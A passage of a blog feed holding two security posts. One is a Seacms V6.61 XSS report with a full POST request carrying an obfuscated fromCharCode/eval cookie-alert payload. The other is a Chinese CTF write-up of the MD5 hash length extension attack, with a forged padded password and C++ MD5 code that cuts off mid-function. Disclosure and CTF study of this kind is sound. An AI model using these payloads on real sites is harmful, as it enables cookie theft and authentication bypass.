class="line">&lt;details&#x2F;open&#x2F;ontoggle&#x3D;eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(100)+String.fromCharCode(111)+String.fromCharCode(99)+String.fromCharCode(117)+String.fromCharCode(109)+String.fromCharCode(101)+String.fromCharCode(110)+String.fromCharCode(116)+String.fromCharCode(46)+String.fromCharCode(99)+String.fromCharCode(111)+String.fromCharCode(111)+String.fromCharCode(107)+String.fromCharCode(105)+String.fromCharCode(101)+String.fromCharCode(41))&gt;</span><br><span class="line">&#96;&#96;&#96;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>POST /ADMIN/admin_video.php?action=save&amp;acttype=add HTTP/1.1<br>Host: cms.jas0nwhy.top<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="http://cms.jas0nwhy.top/ADMIN/admin_video.php?action=add">http://cms.jas0nwhy.top/ADMIN/admin_video.php?action=add</a><br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 1354<br>Cookie: PHPSESSID=8k4mkaq9l3ps7dcrcvafetelt6; HISTORY={video:[{“name”:”123”,”link”:”<a href="http://cms.jas0nwhy.top/detail/?8.html&quot;,&quot;pic&quot;:&quot;/pic/nopic.gif&quot;%7D,%7B&quot;name&quot;:&quot;&amp;lt%5Cu003bscript&amp;gt%5Cu003balert(xss)&amp;lt%5Cu003b/script&amp;gt%5Cu003b&quot;,&quot;link&quot;:&quot;http://cms.jas0nwhy.top/detail/?1.html&quot;,&quot;pic&quot;:&quot;/pic/nopic.gif&quot;%7D,%7B&quot;name&quot;:&quot;&amp;lt%5Cu003bscript&amp;gt%5Cu003balert(document.cookie)&amp;lt%5Cu003b/script&amp;gt%5Cu003b&quot;,&quot;link&quot;:&quot;http://cms.jas0nwhy.top/detail/?5.html&quot;,&quot;pic&quot;:&quot;/pic/nopic.gif&quot;%7D%5D%7D">http://cms.jas0nwhy.top/detail/?8.html&quot;,&quot;pic&quot;:&quot;/pic/nopic.gif&quot;},{&quot;name&quot;:&quot;&amp;lt\u003bscript&amp;gt\u003balert(xss)&amp;lt\u003b/script&amp;gt\u003b&quot;,&quot;link&quot;:&quot;http://cms.jas0nwhy.top/detail/?1.html&quot;,&quot;pic&quot;:&quot;/pic/nopic.gif&quot;},{&quot;name&quot;:&quot;&amp;lt\u003bscript&amp;gt\u003balert(document.cookie)&amp;lt\u003b/script&amp;gt\u003b&quot;,&quot;link&quot;:&quot;http://cms.jas0nwhy.top/detail/?5.html&quot;,&quot;pic&quot;:&quot;/pic/nopic.gif&quot;}]}</a><br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1</p><p>v_commend=0&amp;v_name=test&amp;v_enname=test&amp;v_color=&amp;v_type=5&amp;v_state=&amp;v_pic=&amp;v_spic=&amp;v_gpic=&amp;v_actor=&amp;v_director=&amp;v_commend=0&amp;v_note=&amp;v_tags=&amp;select3=&amp;v_publishyear=&amp;select2=&amp;v_lang=&amp;select1=&amp;v_publisharea=&amp;select4=&amp;v_ver=&amp;v_hit=0&amp;v_monthhit=0&amp;v_weekhit=0&amp;v_dayhit=0&amp;v_len=&amp;v_total=&amp;v_nickname=&amp;v_company=&amp;v_tvs=&amp;v_douban=&amp;v_mtime=&amp;v_imdb=&amp;v_score=&amp;v_scorenum=&amp;v_longtxt=&amp;v_money=0&amp;v_psd=123&amp;v_playfrom%5B1%5D=%E7%BD%91%E7%9B%98%E4%B8%8B%E8%BD%BD&amp;v_playurl%5B1%5D=test&amp;m_downfrom%5B1%5D=%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80%E4%B8%80&amp;m_downurl%5B1%5D=test&amp;v_content=%3Ccode%3E%26lt%3Bdetails%2Fopen%2Fontoggle%3Deval%28String.fromCharCode%2897%29%2BString.fromCharCode%28108%29%2BString.fromCharCode%28101%29%2BString.fromCharCode%28114%29%2BString.fromCharCode%28116%29%2BString.fromCharCode%2840%29%2BString.fromCharCode%28100%29%2BString.fromCharCode%28111%29%2BString.fromCharCode%2899%29%2BString.fromCharCode%28117%29%2BString.fromCharCode%28109%29%2BString.fromCharCode%28101%29%2BString.fromCharCode%28110%29%2BString.fromCharCode%28116%29%2BString.fromCharCode%2846%29%2BString.fromCharCode%2899%29%2BString.fromCharCode%28111%29%2BString.fromCharCode%28111%29%2BString.fromCharCode%28107%29%2BString.fromCharCode%28105%29%2BString.fromCharCode%28101%29%2BString.fromCharCode%2841%29%29%26gt%3B%3C%2Fcode%3E&amp;Submit=%E7%A1%AE%E5%AE%9A%E6%8F%90%E4%BA%A4</p><p>```</p><h4 id="vulnerability-trigger-point"><a href="#vulnerability-trigger-point" class="headerlink" title="vulnerability trigger point"></a>vulnerability trigger point</h4><p><img src="https://github.com/Jas0nwhy/vulnerability/blob/master/seacms1.JPG?raw=true" alt="image">  </p><p><img src="https://github.com/Jas0nwhy/vulnerability/blob/master/seacms2.JPG?raw=true" alt="image">  </p><p><img src="https://github.com/Jas0nwhy/vulnerability/blob/master/seacms3.JPG?raw=true" alt="image"></p><p><img src="https://github.com/Jas0nwhy/vulnerability/blob/master/seacms4.JPG?raw=true" alt="image">  </p><p><img src="https://github.com/Jas0nwhy/vulnerability/blob/master/seacms5.jpg?raw=true" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Seacms-V6-61-has-XSS-vulnerability-in-site-name-parameter-of-admin-video-php&quot;&gt;&lt;a href=&quot;#Seacms-V6-61-has-XSS-vulnerability-in-site-n
      
    
    </summary>
    
    
      <category term="Seacms" scheme="http://yoursite.com/child/tags/Seacms/"/>
    
      <category term="xss" scheme="http://yoursite.com/child/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>hash长度扩展攻击</title>
    <link href="http://yoursite.com/child/2018/07/20/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB(1)/"/>
    <id>http://yoursite.com/child/2018/07/20/hash长度扩展攻击(1)/</id>
    <published>2018-07-20T03:35:12.000Z</published>
    <updated>2018-07-22T14:27:59.702Z</updated>
    
    <content type="html"><![CDATA[<h3 id="hash长度扩展攻击"><a href="#hash长度扩展攻击" class="headerlink" title="hash长度扩展攻击"></a>hash长度扩展攻击</h3><h4 id="MD5加密算法"><a href="#MD5加密算法" class="headerlink" title="MD5加密算法"></a>MD5加密算法</h4><p><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1ftiqli9nbjj30rz0hjq4r.jpg" alt="image">  </p><h5 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h5><p>首先要知道md5的运算都是将明文分割为以512bit（64字节）一组进行运算的，而最后一组不够512bit另做处理  </p><h5 id="补位"><a href="#补位" class="headerlink" title="补位"></a>补位</h5><p>最后一组将含有两部分有效信息，一是明文%512bit的数据，二是记录的原消息总长（固定占有64位，也就是8个字节），那么其中剩下的位置=512-64-明文%512bit的部分由100000…（在16进制中为800000…）补满<br>例：<img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1ftir5g26ywj30io02pmwx.jpg" alt="image"><br>前面的616263是明文的尾部，800000…是补位的，1800…是明文长度   </p><h5 id="链接变量"><a href="#链接变量" class="headerlink" title="链接变量"></a>链接变量</h5><p>链接变量最开始是ABCD四个初始序列，共128位  </p><pre><code>A=0x67452301B=0xefcdab89C=0x98badcfeD=0x10325476   </code></pre><p>将第一组链接变量与第一组明文进行复杂运算，算出一组新的A,B,C,D的值，如果消息小于512，也就是只需要计算一次，这时候将新的ABCD的值按ABCD的顺序级联，然后输出，就是MD5的值，如果消息大于512的话，就用第一次算的MD5的值进行后面部分的运算算出新的MD5值，以此类推。  </p><h4 id="长度扩展攻击原理"><a href="#长度扩展攻击原理" class="headerlink" title="长度扩展攻击原理"></a>长度扩展攻击原理</h4><p>加入有这么一个情况，有一个需要MD5加密的字符串C由A和B两部分组成，A是未知的（也可以理解为salt）但是我们知道它的长度和MD5值，B是已知的且可控的，那么<br>我们将B的值构造一下，就可以得到字符串C的值。  </p><h5 id="引子："><a href="#引子：" class="headerlink" title="引子："></a>引子：</h5><p>假如A为test（十六进制为0x74657374）<br>那么我们构造B，使A+B等于512位，且形式与需要补位的最后一组一样  </p><pre><code>B=800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000   </code></pre><p>接着在后面添加上B=0x746573748，此时str将大于512位，md5加密时系统会自动补位为1024位，并分为两组</p><pre><code>第一组=74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000第二组=74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000   </code></pre><p>这样程序先计算第一部分，得到ABCD链接变量  </p><pre><code>A=0xcd6b8f09B=0x73d32146C=0x834edecaD=0xf6b42726</code></pre><p>第二部分就用第一部分的ABCD链接变量去运算得到新的ABCD链接变量  </p><pre><code>A=0x226359e5b=0x99df12ebC=0x6853f59eD=0xf5406385  </code></pre><p>最后高低位逆序得到MD5值e5596322eb12df999ef55368856340f5   </p><h5 id="攻击："><a href="#攻击：" class="headerlink" title="攻击："></a>攻击：</h5><p>现在我们知道A长度是4，MD5值高低位逆序得到的ABCD链接变量是</p><pre><code>A=0xcd6b8f09B=0x73d32146C=0x834edecaD=0xf6b42726   </code></pre><p>这时我们构造</p><pre><code>B=%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00test  </code></pre><p>这时C大于512位，补位为1024位，其实前512位得到的ABCD我们已经知道，那么如果我们把初始链接变量改为前512位得到的ABCD计算一下0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000<br>的MD5，发现是e5596322eb12df999ef55368856340f5，这样两个不同的b值得到了一样的MD5值   </p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>通过实例更好理解，这是实验吧的让我进去<br><img src="https://screenshotscdn.firefoxusercontent.com/images/0804fc7f-c908-48af-afc1-6ac0ace595c3.png" alt="image"><br>随便输入username和admin抓包<br><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1ftiz6v0sn9j30xv07ajsz.jpg" alt="image"><br>将source值改为1发包得到关键源码  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;</span><br><span class="line">$secret &#x3D; &quot;XXXXXXXXXXXXXXX&quot;; &#x2F;&#x2F; This secret is 15 characters long for security!</span><br><span class="line"></span><br><span class="line">$username &#x3D; $_POST[&quot;username&quot;];</span><br><span class="line">$password &#x3D; $_POST[&quot;password&quot;];</span><br><span class="line"></span><br><span class="line">if (!empty($_COOKIE[&quot;getmein&quot;])) &#123;</span><br><span class="line">    &#x2F;&#x2F;要求username要等于admin，但是password要不等于admin</span><br><span class="line">    if (urldecode($username) &#x3D;&#x3D;&#x3D; &quot;admin&quot; &amp;&amp; urldecode($password) !&#x3D; &quot;admin&quot;) &#123;</span><br><span class="line">        &#x2F;&#x2F;要求传入的getmein值要等于MD5加密后的salt+username+password</span><br><span class="line">        if ($COOKIE[&quot;getmein&quot;] &#x3D;&#x3D;&#x3D; md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            echo &quot;Congratulations! You are a registered user.\n&quot;;</span><br><span class="line">            die (&quot;The flag is &quot;. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        die (&quot;You are not an admin! LEAVE.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;这里规定sample-hash值为MD5加密后的salt+adminadmin</span><br><span class="line">setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));</span><br><span class="line"></span><br><span class="line">if (empty($_COOKIE[&quot;source&quot;])) &#123;</span><br><span class="line">    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    if ($_COOKIE[&quot;source&quot;] !&#x3D; 0) &#123;</span><br><span class="line">        echo &quot;&quot;; &#x2F;&#x2F; This source code is outputted here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这道题要求我们post传入的username=admin，password！=admin，又要$COOKIE[“getmein”] === md5($secret . urldecode($username . $password)),这里就要用到hash长度扩展攻击<br>现在我们知道了：<br>salt的长度是15<br>salt+adminadmin的MD5值是571580b26c65f306376d4f64e53cb5c7<br>那么，我们现在就要开始构造password=</p><pre><code>admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin</code></pre><p>使得拼接后的字符串为</p><pre><code>012345678901234adminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin  </code></pre><p>这里利用password将拼接字符串大于512位，系统将自动补位为1024位，前512位的MD5值就是MD5(salt+admin+admin)(这个我们是已知的，就是sample-hash)，那么我们将sample—hash的值高低位逆序得到的ABCD链接向量换掉初始ABCD链接向量进行MD5运算(也就是直接运算第二组),最终得到的值就是md5($secret . urldecode($username . $password))<br>更换初始链接变量进行MD5运算代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;cmath&gt;</span><br><span class="line">#include &lt;cstdio&gt;</span><br><span class="line">#include &lt;vector&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">#include &lt;cstring&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">using namespace std;</span><br><span class="line">typedef unsigned int uint;</span><br><span class="line">typedef long long LL;</span><br><span class="line">const int MAXN &#x3D; 1e6 + 5;</span><br><span class="line">const int mod &#x3D; 1e9 + 7;</span><br><span class="line"> </span><br><span class="line">struct MD5 &#123;</span><br><span class="line"> </span><br><span class="line">    typedef void (MD5::*deal_fun)(uint&amp;, uint, uint, uint, uint, uint, uint);&#x2F;&#x2F;用于定义函数指针数组</span><br><span class="line">    string init_str;&#x2F;&#x2F;数据字符串</span><br><span class="line">    uint init_arr[1000];&#x2F;&#x2F;最终的数据数组&#123;进行扩充处理后的数据&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    const static int MAXN &#x3D; 1e2;</span><br><span class="line"> </span><br><span class="line">    static uint s_state[4];&#x2F;&#x2F;最开始的默认静态渐变变量</span><br><span class="line"> </span><br><span class="line">    uint state[4];&#x2F;&#x2F;这个也是默认渐变变量，但是会改变</span><br><span class="line"> </span><br><span class="line">    static uint rolarray[4][4];&#x2F;&#x2F;位移数组</span><br><span class="line">    static uint mN[4][16];&#x2F;&#x2F;对M数组的处理</span><br><span class="line"> </span><br><span class="line">    uint curM;&#x2F;&#x2F;当前处理的直接在整个数据中的位置</span><br><span class="line">    uint lenZ;&#x2F;&#x2F;数据的总长&#123;进行扩充处理后的数据总长，这个数是64的倍数&#125;</span><br><span class="line">    uint offset;&#x2F;&#x2F;需要从第几组开始处理</span><br><span class="line">    uint Tarr[64];&#x2F;&#x2F;当前保存的T数组数据</span><br><span class="line">    uint Memory[64 + 5];&#x2F;&#x2F;当前要处理的64个字节数据</span><br><span class="line">    uint M[16];&#x2F;&#x2F;将64个字节数据分为16个数</span><br><span class="line"> </span><br><span class="line">    MD5();</span><br><span class="line">    MD5(string str, int noffset);</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F;数据处理函数</span><br><span class="line">    inline uint F(uint X, uint Y, uint Z);</span><br><span class="line">    inline uint G(uint X, uint Y, uint Z);</span><br><span class="line">    inline uint H(uint X, uint Y, uint Z);</span><br><span class="line">    inline uint I(uint X, uint Y, uint Z);</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F;循环左移函数</span><br><span class="line">    uint ROL(uint s, uint ws);</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F;过程处理函数</span><br><span class="line">    inline void FF(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac);</span><br><span class="line">    inline void GG(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac);</span><br><span class="line">    inline void HH(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac);</span><br><span class="line">    inline void II(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac);</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F;生成T数组单个数据的函数</span><br><span class="line">    inline uint T(uint i);</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F;将总数据中的64个字节移到Memory数组中</span><br><span class="line">    void data_Init();</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F;建立M数组</span><br><span class="line">    void create_M_arr();</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F;移动a,b,c,d，规则在前面介绍了</span><br><span class="line">    void l_data_change(uint *buf);</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F;产生T数组</span><br><span class="line">    void create_T_arr();</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F;得到最终MD5值</span><br><span class="line">    string get_MD5();</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F;过程处理</span><br><span class="line">    void processing();</span><br><span class="line"> </span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">uint MD5::rolarray[4][4] &#x3D; &#123;</span><br><span class="line">    &#123; 7, 12, 17, 22 &#125;,</span><br><span class="line">    &#123; 5, 9, 14, 20 &#125;,</span><br><span class="line">    &#123; 4, 11, 16, 23 &#125;,</span><br><span class="line">    &#123; 6, 10, 15, 21 &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">uint MD5::mN[4][16] &#x3D; &#123;</span><br><span class="line">    &#123; 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 &#125;,</span><br><span class="line">    &#123; 1, 6, 11, 0, 5, 10, 15, 4, 9, 14, 3, 8, 13, 2, 7, 12 &#125;,</span><br><span class="line">    &#123; 5, 8, 11, 14, 1, 4, 7, 10, 13, 0, 3, 6, 9, 12, 15, 2 &#125;,</span><br><span class="line">    &#123; 0, 7, 14, 5, 12, 3, 10, 1, 8, 15, 6, 13, 4, 11, 2, 9 &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">&#x2F;*</span><br><span class="line">传统渐变变量</span><br><span class="line">0x67452301,</span><br><span class="line">0xefcdab89,</span><br><span class="line">0x98badcfe,</span><br><span class="line">0x10325476</span><br><span class="line">这四个东西是可以根据要求更改的，如果取上述几个数则和经常用的MD5算出的结果是一样的</span><br><span class="line">对了，由于有些数据是静态的，改变之后不会进行需要重新进行复制</span><br><span class="line">*&#x2F;</span><br><span class="line"> </span><br><span class="line">uint MD5::s_state[4] &#x3D; &#123;</span><br><span class="line">    0xb2801557,</span><br><span class="line">    0x06f3656c,</span><br><span class="line">    0x644f6d37,</span><br><span class="line">    0xc7b53ce5</span><br><span class="line">&#125;;&#x2F;&#x2F;已经按小端规则反处理哈希值了</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">MD5::MD5() &#123;&#125;</span><br><span class="line"> </span><br><span class="line">MD5::MD5(string str, int noffset &#x3D; 1) &#123;</span><br><span class="line">    offset &#x3D; noffset;</span><br><span class="line">    curM &#x3D; (noffset - 1) * 64;&#x2F;&#x2F;从0位置处开始处理</span><br><span class="line">    init_str &#x3D; str;&#x2F;&#x2F;对数据字符串进行处理</span><br><span class="line">    lenZ &#x3D; init_str.length();</span><br><span class="line">    memset(init_arr, 0, sizeof(init_arr));</span><br><span class="line"> </span><br><span class="line">    for(int i &#x3D; 0; i &lt; lenZ; i ++) &#123;</span><br><span class="line">        init_arr[i] &#x3D; str[i];&#x2F;&#x2F;最终的数据数组进行赋值</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;*</span><br><span class="line">        将数据扩充到取模64个字节等于56个字节</span><br><span class="line">        第一个填充0x80，然后就是0x00了</span><br><span class="line">    *&#x2F;</span><br><span class="line">    if(lenZ % 64 !&#x3D; 56) init_arr[lenZ ++] &#x3D; 0x80;</span><br><span class="line">    while(lenZ % 64 !&#x3D; 56) &#123;</span><br><span class="line">        init_arr[lenZ ++] &#x3D; 0x00;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;*</span><br><span class="line">        最后8个字节保存了没扩充钱位数的多少，记住是位数的个数不是字节的个数，同时是按照小端规则</span><br><span class="line">    *&#x2F;</span><br><span class="line">    uint lengthbits &#x3D; init_str.length() * 8;</span><br><span class="line">    init_arr[lenZ ++] &#x3D; lengthbits &amp; 0xff;</span><br><span class="line">    init_arr[lenZ ++] &#x3D; lengthbits &gt;&gt; 8 &amp; 0xff;</span><br><span class="line">    init_arr[lenZ ++] &#x3D; lengthbits &gt;&gt; 16 &amp; 0xff;</span><br><span class="line">    init_arr[lenZ ++] &#x3D; lengthbits &gt;&gt; 24 &amp; 0xff;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F;因为uint最多32位所以我们只要考虑四个字节就可以了，虽然实际上要考虑64位，嘿</span><br><span class="line">    lenZ +&#x3D; 4;&#x2F;&#x2F;这步我没读懂！！！</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">   